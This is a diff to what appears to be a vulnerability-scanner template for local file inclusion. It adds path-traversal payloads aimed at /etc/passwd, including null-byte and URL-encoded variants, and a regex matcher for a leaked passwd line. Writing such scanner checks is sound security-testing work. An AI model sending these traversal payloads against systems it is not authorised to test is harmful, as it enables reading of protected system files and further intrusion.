@@ -12,8 +12,11 @@ http:
 
     payloads:
       lfi_payloads:
-        - "../../../../../etc/passwd"
         - "/etc/passwd"
+        - "../../../../../etc/passwd"
+        - "../../../../../etc/passwd%00"
+        - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+        - "/../../../../../../../../etc/passwd"
 
     fuzzing:
       - part: query
@@ -23,6 +26,7 @@ http:
 
     matchers:
       - type: regex
-        regex:
-          - "root:x:0:0:[^:]+:[^:]+:[^:]+" # Full match for passwd line
+        name: linux-lfi-success
         part: body
+        regex:
+          - "root:x:0:0:[^:]+:[^:]+:[^:]+"
